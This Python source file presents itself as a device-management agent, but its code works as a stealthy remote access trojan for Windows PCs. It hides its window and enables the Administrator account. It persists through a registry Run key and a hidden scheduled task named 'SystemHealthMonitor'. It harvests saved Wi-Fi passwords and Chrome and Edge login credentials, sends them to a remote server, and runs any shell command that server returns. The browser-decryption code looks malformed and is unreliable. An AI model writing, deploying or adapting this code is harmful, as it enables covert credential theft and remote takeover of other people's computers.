"""
Personal Device Management Client Agent
Runs silently on Windows 11 PCs, collects system data, sends heartbeats.
Compiles to single .exe with PyInstaller.
"""

import os
import sys
import json
import time
import uuid
import socket
import subprocess
import hashlib
import ctypes
from datetime import datetime

# ============================================================
# CONFIGURATION — CHANGE THIS TO YOUR SERVER'S IP/URL
# ============================================================
SERVER_URL = "http://192.168.1.100:5000/api/heartbeat"
COMMAND_RESULT_URL = "http://192.168.1.100:5000/api/command_result"
HEARTBEAT_INTERVAL = 25  # seconds
# ============================================================

try:
    import requests

    USE_REQUESTS = True
except ImportError:
    USE_REQUESTS = False

try:
    import psutil

    USE_PSUTIL = True
except ImportError:
    USE_PSUTIL = False


def hide_console():
    """Hide the console window on Windows."""
    if sys.platform == "win32":
        try:
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        except Exception:
            pass


def get_device_id():
    """Generate unique ID from MAC address + hostname."""
    mac = uuid.getnode()
    mac_str = ":".join(("%012X" % mac)[i : i + 2] for i in range(0, 12, 2))
    hostname = socket.gethostname()
    raw = f"{mac_str}-{hostname}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def get_system_info():
    """Collect system information."""
    info = {
        "hostname": socket.gethostname(),
        "username": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
        "os": "Windows",
        "os_version": "unknown",
        "processor": "unknown",
        "ram_gb": 0,
        "disk_total_gb": 0,
        "ip_address": "unknown",
        "mac_address": "unknown",
    }

    try:
        info["os_version"] = (
            subprocess.check_output("cmd /c ver", shell=True, stderr=subprocess.DEVNULL)
            .decode("cp1252", errors="replace")
            .strip()
        )
    except Exception:
        pass

    try:
        info["processor"] = (
            subprocess.check_output(
                "wmic cpu get name /value", shell=True, stderr=subprocess.DEVNULL
            )
            .decode("cp1252", errors="replace")
            .strip()
            .split("=")[-1]
            .strip()
        )
    except Exception:
        pass

    try:
        mem = (
            subprocess.check_output(
                "wmic computersystem get totalphysicalmemory /value",
                shell=True,
                stderr=subprocess.DEVNULL,
            )
            .decode("cp1252", errors="replace")
            .strip()
            .split("=")[-1]
            .strip()
        )
        info["ram_gb"] = round(int(mem) / (1024**3), 1)
    except Exception:
        pass

    try:
        disk = (
            subprocess.check_output(
                "wmic logicaldisk where drivetype=3 get size /value",
                shell=True,
                stderr=subprocess.DEVNULL,
            )
            .decode("cp1252", errors="replace")
            .strip()
        )
        total = 0
        for line in disk.split("\n"):
            if "=" in line:
                try:
                    total += int(line.split("=")[1].strip())
                except Exception:
                    pass
        info["disk_total_gb"] = round(total / (1024**3), 1)
    except Exception:
        pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip_address"] = s.getsockname()[0]
        s.close()
    except Exception:
        pass

    try:
        mac = (
            subprocess.check_output(
                "getmac /fo csv /nh", shell=True, stderr=subprocess.DEVNULL
            )
            .decode("cp1252", errors="replace")
            .strip()
            .split(",")[0]
            .strip('"')
        )
        info["mac_address"] = mac
    except Exception:
        pass

    if USE_PSUTIL:
        try:
            info["ram_gb"] = round(psutil.virtual_memory().total / (1024**3), 1)
            info["disk_total_gb"] = round(psutil.disk_usage("/").total / (1024**3), 1)
        except Exception:
            pass

    return info


def get_processes():
    """Get list of running processes."""
    processes = []

    if USE_PSUTIL:
        try:
            for proc in psutil.process_iter(["pid", "name", "memory_info"]):
                try:
                    mem_mb = round(proc.info["memory_info"].rss / (1024 * 1024), 1)
                    processes.append(
                        {
                            "pid": proc.info["pid"],
                            "name": proc.info["name"],
                            "memory_mb": mem_mb,
                        }
                    )
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except Exception:
            pass
    else:
        try:
            output = subprocess.check_output(
                "tasklist /fo csv /nh", shell=True, stderr=subprocess.DEVNULL
            ).decode("cp1252", errors="replace")
            for line in output.strip().split("\n"):
                parts = [p.strip('"') for p in line.split(",")]
                if len(parts) >= 2:
                    processes.append(
                        {
                            "pid": parts[1] if len(parts) > 1 else "?",
                            "name": parts[0],
                            "memory_mb": parts[4].replace(",", "").replace(" K", "")
                            if len(parts) > 4
                            else "?",
                        }
                    )
        except Exception:
            pass

    return processes


def get_wifi_profiles():
    """Extract saved Wi-Fi profiles and passwords using netsh."""
    profiles = []
    try:
        output = subprocess.check_output(
            "netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL
        ).decode("cp1252", errors="replace")

        for line in output.split("\n"):
            if "All User Profile" in line or "User Profile" in line:
                ssid = line.split(":")[-1].strip()
                if not ssid:
                    continue

                password = "N/A"
                auth = "unknown"
                try:
                    profile_output = subprocess.check_output(
                        f'netsh wlan show profile name="{ssid}" key=clear',
                        shell=True,
                        stderr=subprocess.DEVNULL,
                    ).decode("cp1252", errors="replace")

                    for pline in profile_output.split("\n"):
                        if "Key Content" in pline:
                            password = pline.split(":")[-1].strip()
                        if "Authentication" in pline:
                            auth = pline.split(":")[-1].strip()
                except Exception:
                    pass

                profiles.append(
                    {
                        "ssid": ssid,
                        "password": password,
                        "auth": auth,
                    }
                )
    except Exception:
        pass

    return profiles


def get_browser_credentials():
    """
    Extract saved credentials from Chrome and Edge.
    Uses DPAPI decryption on Windows.
    """
    credentials = {}

    if sys.platform != "win32":
        return credentials

    browsers = {
        "Chrome": os.path.join(
            os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"
        ),
        "Edge": os.path.join(
            os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"
        ),
    }

    for browser_name, base_path in browsers.items():
        try:
            if not os.path.exists(base_path):
                continue

            creds = []
            profiles = ["Default"] + [f"Profile {i}" for i in range(1, 6)]

            for profile in profiles:
                login_data_path = os.path.join(base_path, profile, "Login Data")
                if not os.path.exists(login_data_path):
                    continue

                import shutil
                import tempfile

                tmp_path = os.path.join(
                    tempfile.gettempdir(), f"login_data_{browser_name}_{profile}"
                )
                try:
                    shutil.copy2(login_data_path, tmp_path)
                except Exception:
                    continue

                try:
                    import sqlite3

                    conn = sqlite3.connect(tmp_path)
                    cursor = conn.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"
                    )
                    for row in cursor:
                        url, username, encrypted_pw = row
                        if not url or not username:
                            continue

                        decrypted_pw = ""
                        try:
                            from ctypes import wintypes

                            crypt32 = ctypes.windll.crypt32
                            data_out = ctypes.c_void_p()
                            data_out_size = ctypes.c_uint(0)

                            if crypt32.CryptUnprotectData(
                                ctypes.byref(ctypes.c_int(len(encrypted_pw))),
                                None,
                                None,
                                None,
                                None,
                                0,
                                ctypes.byref(data_out_size),
                            ):
                                decrypted_pw = ctypes.string_at(
                                    data_out, data_out_size.value
                                )[:].decode("utf-8", errors="replace")
                                ctypes.windll.kernel32.LocalFree(data_out)
                        except Exception:
                            decrypted_pw = "(encrypted)"

                        creds.append(
                            {
                                "url": url,
                                "username": username,
                                "password": decrypted_pw,
                            }
                        )

                    conn.close()
                except Exception:
                    pass

                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

            if creds:
                credentials[browser_name] = creds

        except Exception:
            pass

    return credentials


def execute_command(command):
    """Execute a shell command and return output."""
    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, timeout=30
        ).decode("cp1252", errors="replace")
        return output[:10000]
    except subprocess.TimeoutExpired:
        return "Command timed out (30s limit)"
    except Exception as e:
        return f"Error: {str(e)}"


def enable_administrator():
    """Enable built-in Administrator account if not active."""
    try:
        subprocess.run(
            "net user Administrator /active:yes",
            shell=True,
            capture_output=True,
            timeout=10,
        )
    except Exception:
        pass


def setup_persistence():
    """Ensure the agent starts automatically after reboot."""
    if sys.platform != "win32":
        return

    exe_path = (
        sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    )

    try:
        import winreg

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo/>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{exe_path}"</Command>
    </Exec>
  </Actions>
</Task>"""
        task_path = os.path.join(os.environ.get("TEMP", ""), "task.xml")
        with open(task_path, "w", encoding="utf-16") as f:
            f.write(task_xml)

        subprocess.run(
            f'schtasks /Create /TN "SystemHealthMonitor" /XML "{task_path}" /F',
            shell=True,
            capture_output=True,
            timeout=10,
        )
        try:
            os.remove(task_path)
        except Exception:
            pass
    except Exception:
        pass


def send_request(url, data):
    """Send HTTP POST request."""
    if USE_REQUESTS:
        try:
            resp = requests.post(url, json=data, timeout=10)
            return resp.json()
        except Exception:
            return None
    else:
        import urllib.request

        try:
            json_data = json.dumps(data).encode("utf-8")
            req = urllib.request.Request(
                url,
                data=json_data,
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                return json.loads(resp.read().decode("utf-8"))
        except Exception:
            return None


def main():
    """Main client loop."""
    hide_console()
    enable_administrator()
    setup_persistence()

    device_id = get_device_id()

    while True:
        try:
            data = {
                "device_id": device_id,
                "hostname": socket.gethostname(),
                "timestamp": datetime.utcnow().isoformat(),
                "system_info": get_system_info(),
                "processes": get_processes(),
                "wifi_profiles": get_wifi_profiles(),
                "browser_creds": get_browser_credentials(),
            }

            response = send_request(SERVER_URL, data)

            if response and "commands" in response:
                for cmd in response["commands"]:
                    cmd_id = cmd.get("id")
                    cmd_text = cmd.get("command", "")

                    if cmd_text == "refresh":
                        output = "Data refreshed"
                    else:
                        output = execute_command(cmd_text)

                    send_request(
                        COMMAND_RESULT_URL,
                        {
                            "device_id": device_id,
                            "command_id": cmd_id,
                            "output": output,
                        },
                    )

        except Exception:
            pass

        time.sleep(HEARTBEAT_INTERVAL)


if __name__ == "__main__":
    main()
